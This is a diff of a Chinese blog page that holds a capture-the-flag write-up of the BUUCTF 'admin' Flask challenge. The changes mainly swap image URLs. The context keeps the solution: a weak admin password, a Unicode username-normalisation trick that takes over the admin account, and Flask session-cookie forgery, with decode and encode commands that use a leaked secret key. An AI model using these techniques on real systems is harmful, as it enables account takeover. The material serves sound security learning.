@@ -26,20 +26,20 @@
 <meta property="og:site_name" content="Have a good day !">
 <meta property="og:description" content="buuctf  admin">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675759156538-f71c8642-da8a-4531-bfec-409dda95841d.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766677778-3cedcc9b-52b0-4ebe-9c8e-3e3db6d12069.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766755958-2ce8df5c-33cb-4316-89e6-8693aafac5dc.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766890220-288c2aeb-31a3-42e9-a102-8037b316b50b.png">
-<meta property="og:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766920890-f564cdb4-adfd-41d5-bd47-59f2fcc5c9c8.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png">
 <meta property="article:published_time" content="2023-02-17T13:34:46.000Z">
-<meta property="article:modified_time" content="2023-02-17T13:43:58.641Z">
+<meta property="article:modified_time" content="2023-03-08T15:46:46.193Z">
 <meta property="article:author" content="Z1d10t">
 <meta property="article:tag" content="弱口令">
 <meta property="article:tag" content="flask框架">
 <meta property="article:tag" content="session伪造">
 <meta property="article:tag" content="unicode特殊字符">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675759156538-f71c8642-da8a-4531-bfec-409dda95841d.png">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png">
 
 
 <link rel="canonical" href="http://example.com/2023/02/17/buuctf-22-admin/">
@@ -129,7 +129,7 @@
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <img class="site-author-image" itemprop="image" alt="Z1d10t"
-      src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/a.png">
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
   <p class="site-author-name" itemprop="name">Z1d10t</p>
   <div class="site-description" itemprop="description">welcome to my blog (*^_^*)</div>
 </div>
@@ -181,7 +181,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/17/buuctf-22-admin/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="http://rpn8gb60r.hb-bkt.clouddn.com/blog/a.png">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
       <meta itemprop="name" content="Z1d10t">
     </span>
 
@@ -206,9 +206,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-02-17 21:34:46 / 修改时间：21:43:58" itemprop="dateCreated datePublished" datetime="2023-02-17T21:34:46+08:00">2023-02-17</time>
+      <time title="创建时间：2023-02-17 21:34:46" itemprop="dateCreated datePublished" datetime="2023-02-17T21:34:46+08:00">2023-02-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 23:46:46" itemprop="dateModified" datetime="2023-03-08T23:46:46+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -243,7 +249,7 @@
 <p>这到题目有一个非预期，弱口令直接爆出来了，直接账号为admin，密码为123就能拿到flag，我还想这题怎么这么简单，看了别人的题解才发现又是一道学习的题目。</p>
 <p>预期解：</p>
 <p>先申请一个账号，抓包看到：</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675759156538-f71c8642-da8a-4531-bfec-409dda95841d.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png" alt="img"></p>
 <p>那么这道题的思路就是让我去登录管理员的账号就能拿到flag了，但是不知道密码</p>
 <p>学习别人的wp：</p>
 <p>在源码中发现一个github链接：<!-- https://github.com/woadsl1234/hctf_flask/ --></p>
@@ -263,7 +269,7 @@
 <p>在代码开头有一行代码：<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>，说明nodeprep是从twisted模块中导入的，利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。而值得注意的是strlower()自定义函数被调用了三次，分别是register、login、change，即注册、登陆、修改密码时都会被调用。</p>
 <p>思路：用ᴬdmin注册，后台代码就会调用一次nodeprep.prepare函数，把用户名转换成Admin；修改一次密码，再次调用nodeprep.prepare函数，使用户名由Admin转换为admin，重新登陆，就可以得到flag。</p>
 <h2 id="预期解二："><a href="#预期解二：" class="headerlink" title="预期解二："></a>预期解二：</h2><p>抓包发现session</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766677778-3cedcc9b-52b0-4ebe-9c8e-3e3db6d12069.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png" alt="img"></p>
 <p>flask session伪造</p>
 <p>先了解一下session：简单说就是保持会话登录，识别用户</p>
 <p>但是一般session是存储在服务器的，但是flask存储在客户端，他是对称加密解密，所以可以进行解码然后伪造编码上传。</p>
@@ -274,7 +280,7 @@
 <p>构造payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c &quot;.eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766755958-2ce8df5c-33cb-4316-89e6-8693aafac5dc.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png" alt="img"></p>
 <p>得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74&#x27;, &#x27;csrf_token&#x27;: b&#x27;fde2b35f0dd325646bb89103d3f068da2657ca94&#x27;, &#x27;image&#x27;: b&#x27;JmGR&#x27;, &#x27;name&#x27;: &#x27;abc&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -282,12 +288,12 @@
 <p>构造payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74&#x27;, &#x27;csrf_token&#x27;: b&#x27;fde2b35f0dd325646bb89103d3f068da2657ca94&#x27;, &#x27;image&#x27;: b&#x27;JmGR&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766890220-288c2aeb-31a3-42e9-a102-8037b316b50b.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png" alt="img"></p>
 <p>得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY</span><br></pre></td></tr></table></figure>
 
 <p>更换session，成功</p>
-<p><img src="http://rpn8gb60r.hb-bkt.clouddn.com/blog/1675766920890-f564cdb4-adfd-41d5-bd47-59f2fcc5c9c8.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png" alt="img"></p>
 
     </div>
 
